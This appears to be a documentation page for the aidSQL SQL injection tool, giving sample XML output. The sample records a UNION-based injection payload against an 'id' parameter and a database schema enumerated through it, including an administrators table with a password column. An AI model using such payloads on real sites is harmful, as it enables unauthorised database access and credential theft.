# Introduction #

This is a sample file of what to this date the XML output will look like


# Details #

```
<aidSQL>
	<host>www.aidsql.com</host>
	<date>2011-01-26 20:26:19</date>

	<sqli-details>

		<vulnlink>
			http://www.aidsql.com/index.php
		</vulnlink>

		<injection>
			9e99 UNION ALL SELECT CONCAT(0x7b21,1,0x217d),CONCAT(0x7b21,2,0x217d),CONCAT(0x7b21,3,0x217d),CONCAT(0x7b21,4,0x217d)--
		</injection>

		<parameters>
			<param>id</param>
			<vulnerable>1</vulnerable>
		</parameters>

		<plugin-details>
			<plugin>UNION</plugin>
			<author>Juan Stange</author>
			<method>injectionunionQuery</method>
		</plugin-details>
	</sqli-details>

	<schemas>

		<database>
			<name>yaguajax</name>
			<version>5.0.82</version>
			<datadir>/var/lib/mysql</datadir>

			<tables>

				<table name="administrators" type="BASE TABLE" engine="MyISAM" collation="latin1_swedish_ci" increment="1?">

					<column name="id">
						<type>int(10) unsigned</type>
						<key>0</key>
						<extra>0</extra>
						<privilege>
							<select>1</select>
							<insert>1</insert>
							<update>1</update>
							<references>1</references>
						</privilege>
					</column>

					<column name="name">
						<type>varchar(30)</type>
						<key>0</key>
						<extra>0</extra>

						<privilege>
							<select>1</select>
							<insert>1</insert>
							<update>1</update>
							<references>1</references>
						</privilege>
					</column>

					<column name="passwd">
						<type>varchar(32)</type>
						<key>0</key>
						<extra>0</extra>

						<privilege>
							<select>1</select>
							<insert>1</insert>
							<update>1</update>
							<references>1</references>
						</privilege>
					</column>
				</table>

				<table name="contents" type="BASE TABLE" engine="MyISAM" collation="latin1_swedish_ci" increment="1?">

					<column name="id">
						<type>int(10) unsigned</type>
						<key>0</key>
						<extra>0</extra>

						<privilege>
							<select>1</select>
							<insert>1</insert>
							<update>1</update>
							<references>1</references>
						</privilege>
					</column>

					<column name="id_section">
						<type>int(10) unsigned</type>
						<key>0</key>
						<extra>0</extra>

						<privilege>
							<select>1</select>
							<insert>1</insert>
							<update>1</update>
							<references>1</references>
						</privilege>
					</column>

					<column name="subpart">
						<type>varchar(15)</type>
						<key>0</key>
						<extra>0</extra>

						<privilege>
							<select>1</select>
							<insert>1</insert>
							<update>1</update>
							<references>1</references>
						</privilege>
					</column>

					<column name="value">
						<type>text</type>
						<key>0</key>
						<extra>0</extra>

						<privilege>
							<select>1</select>
							<insert>1</insert>
							<update>1</update>
							<references>1</references>
						</privilege>
					</column>
				</table>

				<table name="sections" type="BASE TABLE" engine="MyISAM" collation="latin1_swedish_ci" increment="1?">

					<column name="id">
						<type>int(10) unsigned</type>
						<key>0</key>
						<extra>0</extra>

						<privilege>
							<select>1</select>
							<insert>1</insert>
							<update>1</update>
							<references>1</references>
						</privilege>
					</column>

					<column name="name">
						<type>varchar(30)</type>
						<key>0</key>
						<extra>0</extra>

						<privilege>
							<select>1</select>
							<insert>1</insert>
							<update>1</update>
							<references>1</references>
						</privilege>
					</column>
				</table>
			</tables>
		</database>
	</schemas>
</aidSQL>
```